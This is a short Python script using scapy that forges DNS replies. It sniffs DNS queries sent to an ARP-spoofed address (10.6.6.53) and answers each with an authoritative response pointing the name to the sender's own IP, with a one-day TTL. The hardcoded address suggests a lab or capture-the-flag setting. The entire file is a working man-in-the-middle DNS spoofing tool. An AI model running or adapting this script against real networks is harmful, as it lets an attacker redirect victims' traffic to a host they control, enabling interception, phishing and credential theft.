#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"

def handle_dns_request(packet):
    eth = Ether(src=macaddr, dst=packet[Ether].src)     
    ip  = IP(dst=packet[IP].src, src=ipaddr_we_arp_spoofed)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)  # swap ports

    dns = DNS(
        id=packet[DNS].id,
        qr=1,
        opcode=packet[DNS].opcode,
        aa=1,
        qdcount=packet[DNS].qdcount,
        ancount=1,
        qd=DNSQR(
            qname=packet[DNS].qd.qname,
            qtype=packet[DNS].qd.qtype,
            qclass=packet[DNS].qd.qclass
        ),
        an=DNSRR(
            rrname=packet[DNS].qd.qname,
            rdata=ipaddr,
            ttl=86400
        )
    )

    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")

    # Some debugging
    dns_response[DNS].show()

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    main()
